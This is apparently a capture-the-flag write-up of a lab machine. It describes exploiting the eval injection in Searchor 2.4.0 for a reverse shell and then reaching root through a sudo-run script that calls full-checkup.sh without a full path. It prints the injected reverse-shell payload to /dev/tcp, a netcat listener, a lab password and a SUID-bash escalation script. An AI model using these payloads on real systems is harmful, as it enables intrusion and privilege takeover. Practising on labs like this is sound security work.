## **Summary**

Arbitrary code execution in `Searchor 2.4.0` - a python library handling the search mechanism in the web application - gave us inital access on the machine. Then a password found in a git config file was used to run a script using sudo. This script presented a flow (not using the full path of a script passed as argument) allowing us to escalate our privileges.

## **Enumeration**

### **nmap**

Initial port scan show two open ports, 80 and 22

```sh
$ nmap -sVC -oN nmap/svc.nmap 10.10.11.208
# Nmap 7.93 scan initiated Mon Jun  5 10:36:51 2023
...
PORT   STATE SERVICE VERSION

```

### **http - port 80**

The home page conatains a shearch form.

We intercepted the post request to `/search` endpoint and noticed that the `engine` parameter is used to find the service we want to search in, and the other parameter `query` is used as the search query.

The Page footer reveales the python library behind this searching mechanism wich is `searchor 2.4.0`.

`Searchor 2.4.0` is vulnerable to an [Arbitrary Code Execution](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303) due to unsafe implementation of eval method.

> Vulnerable code:
>
> ``` python
> url = eval(
>    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
> )

## **Initial access**

To exploit this vulnerability, we started by setting up a listener

```
nc -lnvp 9000
```

Then we used the following line as the `query` parameter, and launched a search request.

```
',+__import__('os').system('bash+-c+\"bash+-i+>%26+/dev/tcp/10.10.14.75/9001+0>%261\"'))%23
```

Finally we got connection back on our listener.

## **Privilege escalation**

We found a virtual host `gitea` in the default config file of `apache2` web server.

> Gitea is a painless, self-hosted, all-in-one software development service. It includes Git hosting, code review, team collaboration, package registry, and CI/CD. It is similar to GitHub, Bitbucket and GitLab, [Read More](https://docs.gitea.com/)
{: .prompt-info}

```sh
cat /etc/apache2/sites-enabled/000-default.conf
```

![](/assets/busqueda/006.png)

We also found the credentials (`cody:jh1usoih2bkjaspwe92`) used to connect to `gitea`.

```
cat /var/www/app/.git/config
```

The password we found was reused by our current user (`svc`), which allowed us to run sudo command. As a result we found that the current user can execute a python script
(`/usr/bin/python3 /opt/scripts/system-checkup.py *`) as root using sudo.

![](/assets/busqueda/008.png)

We ran it to see what it does, it tured out it accept one of three arguments:

* docker-ps
* docker-inspect
* full-checkup

![](/assets/busqueda/009.png)

`docker-ps` and `docker-inspect` were not of interest to us as `docker-ps` only lists running containers for example.

![](/assets/busqueda/010.png)

The last action (`full-checkup`) on the other hand was very interesting, when ran without any arguments it threw an error.

![](/assets/busqueda/011.png)

With a little bit of diggin, we found that the `full-checkup` action trigger the execution of a script named `full-checkup.sh`.

The problem here is that the full path is not provided, so whenever we ran `system-checkup.py` it would look for `full-checkup.sh` in the current directory.

To exploit this flow we created a file `full-checkup.sh` with the following content.

```sh
#!/bin/bash

cp /bin/bash /tmp/.hrh
chmod u+s /tmp/.hrh
```

Then we ran

```
/usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Once finished, a file `.hrh` which is a copy of bash with SUID bit set was created in `/tmp` directory, we ran and we got a root shell.

```
./.hrh -p
```
